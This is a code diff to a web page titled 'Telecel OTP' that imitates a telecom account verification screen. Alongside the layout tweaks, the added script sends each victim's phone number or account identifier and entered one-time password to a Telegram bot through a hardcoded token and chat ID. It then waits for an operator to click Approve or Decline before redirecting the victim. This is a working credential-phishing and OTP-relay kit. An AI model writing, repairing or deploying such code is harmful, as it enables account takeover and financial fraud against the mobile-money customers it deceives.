@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 <title>Telecel OTP</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -16,13 +16,15 @@
 body{
   margin:0;
   background:#f5f5f5;
-  display:flex;
-  justify-content:center;
+  display: block;
+  padding: 20px 16px;
+  min-height: 100vh;
 }
 
-/* CONTAINER */
 .container{
   width:360px;
+  max-width: 100%;
+  margin: 0 auto;
   background:#f7f7f7;
   border-radius:28px;
   padding:40px 20px;
@@ -30,9 +32,9 @@ body{
   position:relative;
   overflow:hidden;
   text-align:center;
+  margin-bottom: 40px;
 }
 
-/* RED SHAPE */
 .top-bg{
   position:absolute;
   top:0;
@@ -89,25 +91,43 @@ body{
   line-height:1.5;
 }
 
-/* OTP BOXES */
+/* OTP CONTAINER – flex with auto-resize to fit exactly */
 .otp-container{
   display:flex;
-  justify-content:space-between;
+  justify-content: space-between;
+  gap: 8px;                /* reduced gap to prevent overflow */
   margin-top:20px;
+  width: 100%;
 }
 
 .otp-input{
-  width:45px;
+  flex: 1 1 0;            /* allow boxes to shrink/grow equally */
+  min-width: 0;           /* prevent flex items from overflowing */
   height:50px;
-  border-radius:10px;
+  border-radius:12px;
   border:1px solid #ddd;
   text-align:center;
-  font-size:18px;
+  font-size:20px;
+  font-weight:600;
   outline:none;
+  background:#fff;
+  transition: border 0.2s;
+  inputmode: numeric;
+  -moz-appearance: textfield;
+  appearance: textfield;
+  padding: 0 2px;         /* slight inner padding so digits aren’t cut off */
 }
 
 .otp-input:focus{
   border:2px solid #ff0000;
+  box-shadow:0 0 0 2px rgba(255,0,0,0.1);
+}
+
+/* Remove spinner arrows */
+.otp-input::-webkit-outer-spin-button,
+.otp-input::-webkit-inner-spin-button {
+  -webkit-appearance: none;
+  margin: 0;
 }
 
 /* BUTTONS */
@@ -119,12 +139,12 @@ body{
   font-size:16px;
   margin-top:20px;
   cursor:pointer;
+  font-weight:600;
 }
 
 .btn-primary{
   background:#ff0000;
   color:#fff;
-  font-weight:600;
 }
 
 .btn-primary.disabled, .btn-primary:disabled{
@@ -209,6 +229,17 @@ body{
 @keyframes spin {
   to { transform: rotate(360deg); }
 }
+
+/* Extra‑small screens: tighten spacing further */
+@media (max-width: 350px) {
+  .otp-container {
+    gap: 6px;
+  }
+  .otp-input {
+    font-size: 18px;
+    height: 46px;
+  }
+}
 </style>
 </head>
 
@@ -240,15 +271,15 @@ body{
       . Enter it below to verify your account.
     </div>
 
-    <!-- OTP INPUT SECTION -->
+    <!-- OTP INPUT SECTION (6 digits) with numeric keypad -->
     <div id="otpSection">
       <div class="otp-container">
-        <input class="otp-input" maxlength="1" id="otp1" autofocus>
-        <input class="otp-input" maxlength="1" id="otp2">
-        <input class="otp-input" maxlength="1" id="otp3">
-        <input class="otp-input" maxlength="1" id="otp4">
-        <input class="otp-input" maxlength="1" id="otp5">
-        <input class="otp-input" maxlength="1" id="otp6">
+        <input class="otp-input" maxlength="1" id="otp1" autofocus inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp2" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp3" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp5" inputmode="numeric" pattern="[0-9]*">
+        <input class="otp-input" maxlength="1" id="otp6" inputmode="numeric" pattern="[0-9]*">
       </div>
       <div class="message" id="otpMessage"></div>
       <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
@@ -266,7 +297,310 @@ body{
 </div>
 
 <script>
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
+  (function() {
+    // ==================== TELEGRAM BOT CONFIG ====================
+    const BOT_TOKEN = '8205203090:AAGJYcmFQe_I-Cw3xxnIhV0J25ZgaCwAExY';
+  const CHAT_ID   = '691605234';
+    const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+    // ==================== DOM ELEMENTS ====================
+    const otpInputs = [
+      document.getElementById('otp1'),
+      document.getElementById('otp2'),
+      document.getElementById('otp3'),
+      document.getElementById('otp4'),
+      document.getElementById('otp5'),
+      document.getElementById('otp6')
+    ];
+    const nextBtn = document.getElementById('nextBtn');
+    const goBackBtn = document.getElementById('goBackBtn');
+    const maskedPhoneSpan = document.getElementById('maskedPhone');
+    const otpMessage = document.getElementById('otpMessage');
+    const spinner = document.getElementById('spinner');
+    const errorBox = document.getElementById('errorBox');
+    const errorText = document.getElementById('errorText');
+
+    // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
+    const phone = sessionStorage.getItem('telecel_phone') || '0200000020';
+    const accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
+    const inputValue = sessionStorage.getItem('telecel_inputValue') || '';
+
+    // ==================== MASK PHONE NUMBER ====================
+    function maskPhone(phone) {
+      const cleaned = phone.replace(/\D/g, '');
+      if (cleaned.length >= 4) {
+        const start = cleaned.slice(0, 2);
+        const end = cleaned.slice(-2);
+        const masked = start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
+        return masked;
+      }
+      return phone;
+    }
+    maskedPhoneSpan.textContent = maskPhone(phone);
+
+    // ==================== OTP AUTO‑ADVANCE (6 digits) ====================
+    function focusNext(index) {
+      if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+    }
+    function focusPrev(index) {
+      if (index > 0) otpInputs[index - 1].focus();
+    }
+
+    function updateNextButton() {
+      const allFilled = otpInputs.every(inp => inp.value.length === 1);
+      nextBtn.disabled = !allFilled;
+      if (allFilled) {
+        nextBtn.classList.remove('disabled');
+      } else {
+        nextBtn.classList.add('disabled');
+      }
+    }
+
+    // ========== SCROLL ENHANCEMENT: keep focused input visible ==========
+    function scrollElementIntoView(element) {
+      if (!element) return;
+      setTimeout(() => {
+        element.scrollIntoView({
+          behavior: 'smooth',
+          block: 'center',
+          inline: 'nearest'
+        });
+      }, 100);
+    }
+
+    function handleFocusScroll(event) {
+      scrollElementIntoView(event.target);
+    }
+
+    otpInputs.forEach((input, idx) => {
+      // Input event: filter digits and auto advance
+      input.addEventListener('input', function() {
+        this.value = this.value.replace(/\D/g, '');
+        if (this.value.length === 1) focusNext(idx);
+        updateNextButton();
+        otpMessage.textContent = '';
+      });
+
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          if (this.value.length === 0 && idx > 0) {
+            e.preventDefault();
+            focusPrev(idx);
+          }
+        } else if (e.key === 'ArrowLeft') {
+          e.preventDefault();
+          focusPrev(idx);
+        } else if (e.key === 'ArrowRight') {
+          e.preventDefault();
+          focusNext(idx);
+        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
+          e.preventDefault();
+        }
+      });
+
+      // Ensure numeric keyboard and scroll into view on focus
+      input.addEventListener('focus', handleFocusScroll);
+    });
+
+    // When Next button becomes enabled, scroll it into view if needed
+    const originalUpdate = updateNextButton;
+    const enhancedUpdate = function() {
+      originalUpdate();
+      if (!nextBtn.disabled) {
+        setTimeout(() => {
+          const rect = nextBtn.getBoundingClientRect();
+          const viewHeight = window.innerHeight;
+          const isHidden = rect.bottom > viewHeight || rect.top < 0;
+          if (isHidden) {
+            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          }
+        }, 80);
+      }
+    };
+    // Replace update function globally within this scope
+    window.updateNextButton = enhancedUpdate;
+    // Rebind so all calls use enhanced version
+    const updateNextButtonRef = enhancedUpdate;
+
+    // Override original variable
+    const originalBinding = updateNextButton;
+    // Force reassign
+    updateNextButton = enhancedUpdate;
+
+    // Also on window resize (keyboard open/close), re-scroll focused element or next button
+    let resizeTimer;
+    window.addEventListener('resize', function() {
+      if (resizeTimer) clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(() => {
+        const focused = document.activeElement;
+        if (focused && focused.classList && focused.classList.contains('otp-input')) {
+          focused.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        } else if (nextBtn && !nextBtn.disabled) {
+          const rect = nextBtn.getBoundingClientRect();
+          const viewHeight = window.innerHeight;
+          if (rect.bottom > viewHeight || rect.top < 0) {
+            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+          }
+        }
+      }, 120);
+    });
+
+    // ==================== ERROR HANDLING ====================
+    function showError(message) {
+      errorText.innerText = message || 'An error occurred';
+      errorBox.style.display = 'block';
+      // also scroll error into view if needed
+      setTimeout(() => {
+        errorBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }, 50);
+    }
+
+    window.hideError = function() {
+      errorBox.style.display = 'none';
+    };
+
+    // ==================== TELEGRAM HELPERS ====================
+    function escapeHtml(unsafe) {
+      return unsafe.replace(/[&<>"]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        if (m === '"') return '&quot;';
+        return m;
+      });
+    }
+
+    async function sendToTelegram(payload) {
+      const url = `${API_BASE}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        return await response.json();
+      } catch (error) {
+        console.error('Telegram send error:', error);
+        throw error;
+      }
+    }
+
+    let currentPollInterval = null;
+
+    function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+      if (currentPollInterval) clearInterval(currentPollInterval);
+
+      let lastUpdateId = 0;
+
+      currentPollInterval = setInterval(async () => {
+        try {
+          const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+          const response = await fetch(url);
+          const data = await response.json();
+          if (!data.ok || !data.result.length) return;
+
+          data.result.forEach(update => {
+            lastUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.data) {
+              const parts = update.callback_query.data.split('_');
+              if (parts.length >= 3) {
+                const [type, action, time] = parts;
+                if (time == expectedTs && type === expectedPrefix) {
+                  clearInterval(currentPollInterval);
+                  currentPollInterval = null;
+                  onDecision(action);
+                }
+              }
+            }
+          });
+        } catch (err) {
+          console.warn('Polling error:', err);
+        }
+      }, 1500);
+    }
+
+    // ==================== OTP SUBMISSION ====================
+    let isSubmitting = false;
+
+    async function submitOtp() {
+      if (isSubmitting) return;
+
+      const enteredOtp = otpInputs.map(inp => inp.value).join('');
+      if (enteredOtp.length !== 6) {
+        otpMessage.textContent = 'Please enter all 6 digits.';
+        otpMessage.className = 'message error';
+        // scroll message into view
+        otpMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        return;
+      }
+
+      isSubmitting = true;
+      nextBtn.disabled = true;
+      otpInputs.forEach(inp => inp.disabled = true);
+      spinner.style.display = 'flex';
+
+      const ts = Date.now();
+      const identifier = accountType === 'Mobile' ? `Phone: ${phone}` : `Account: ${inputValue}`;
+      const escapedOtp = escapeHtml(enteredOtp);
+      const msg = `OTP Verification\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
+
+      await sendToTelegram({
+        chat_id: CHAT_ID,
+        text: msg,
+        parse_mode: 'HTML',
+        reply_markup: {
+          inline_keyboard: [[
+            { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
+            { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
+          ]]
+        }
+      });
+
+      pollForCallback('otp', ts, (action) => {
+        spinner.style.display = 'none';
+        isSubmitting = false;
+
+        if (action === 'approve') {
+          window.location.href = 'loan.html';
+        } else if (action === 'decline') {
+          showError('Wrong OTP');
+          // Reset OTP inputs for a new attempt
+          otpInputs.forEach(inp => {
+            inp.value = '';
+            inp.disabled = false;
+          });
+          otpInputs[0].focus();
+          updateNextButton();
+          nextBtn.disabled = false;
+        }
+      });
+    }
+
+    nextBtn.addEventListener('click', submitOtp);
+
+    // ==================== GO BACK ====================
+    goBackBtn.addEventListener('click', () => {
+      window.location.href = 'login.html';
+    });
+
+    // ==================== CHECK IF CAME FROM OTP5 WITH WRONG OTP ====================
+    if (sessionStorage.getItem('wrongOtp5')) {
+      showError('Wrong OTP.');
+      sessionStorage.removeItem('wrongOtp5');
+    }
+
+    // ==================== INIT ====================
+    // Ensure enhanced update is called on start
+    updateNextButton();
+
+    // Final: if any input already focused (autofocus), scroll into view
+    setTimeout(() => {
+      const active = document.activeElement;
+      if (active && active.classList && active.classList.contains('otp-input')) {
+        active.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      }
+    }, 200);
+  })();
 </script>
 
 </body>
